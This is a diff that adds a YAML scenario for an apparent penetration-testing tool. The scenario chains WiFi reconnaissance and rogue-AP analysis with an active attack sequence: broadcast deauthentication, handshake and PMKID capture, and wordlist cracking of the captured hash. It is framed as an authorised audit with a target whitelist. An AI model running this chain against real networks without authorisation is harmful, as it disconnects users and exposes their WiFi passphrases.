@@ -1,0 +1,85 @@
+# WiFi Deep Audit - Complete analysis + exploitation chain
+# Chains: recon -> frame dissection -> timing analysis -> security assessment ->
+#         deauth -> handshake capture -> PMKID -> crack -> fingerprinting -> signal analysis
+#
+# Usage:
+#   srt scenario scenarios/wifi_deep_audit.yaml
+#   srt scenario scenarios/wifi_deep_audit.yaml --var target_bssid=AA:BB:CC:DD:EE:FF
+#
+# Requires:
+#   - Monitor-mode NIC (ALFA)
+#   - Target AP in safety/whitelist.yaml
+
+name: wifi_deep_audit
+description: >
+  Complete WiFi deep audit: passive reconnaissance, full frame dissection,
+  timing analysis for rogue AP detection, security grading of all APs,
+  then active exploitation chain (deauth, handshake, PMKID, crack),
+  followed by client fingerprinting and signal analysis.
+  Generates comprehensive PDF report with MITRE ATT&CK mapping.
+
+variables:
+  target_bssid: "AA:BB:CC:DD:EE:FF"
+  target_channel: "6"
+  interface: "wlan0mon"
+  wordlist: "/usr/share/wordlists/rockyou.txt"
+
+options:
+  bail_on_fail: true
+  report_format:
+    - json
+    - markdown
+    - pdf
+
+steps:
+  - module: wifi.recon
+    id: recon
+    params:
+      duration_s: 30
+      channels: "1-13"
+      interface: "{{interface}}"
+
+  - module: wifi.frame_dissector
+    id: dissect
+    params:
+      duration_s: 15
+      interface: "{{interface}}"
+
+  - module: wifi.timing_analyzer
+    id: timing
+    params:
+      analysis_window_s: 30
+
+  - module: wifi.security_assessor
+    id: security
+    params: {}
+
+  - module: wifi.probe_fingerprinter
+    id: fingerprint
+    params: {}
+
+  - module: wifi.signal_analyzer
+    id: signal
+    params: {}
+
+  - module: wifi.deauth
+    params:
+      bssid: "{{target_bssid}}"
+      client: "FF:FF:FF:FF:FF:FF"
+      count: 15
+      channel: "{{target_channel}}"
+
+  - module: wifi.handshake_capture
+    params:
+      bssid: "{{target_bssid}}"
+      channel: "{{target_channel}}"
+
+  - module: wifi.pmkid
+    params:
+      bssid: "{{target_bssid}}"
+      timeout_s: 30
+
+  - module: wifi.psk_crack
+    params:
+      hash_file: "data/captures/hash.22000"
+      wordlist: "{{wordlist}}"
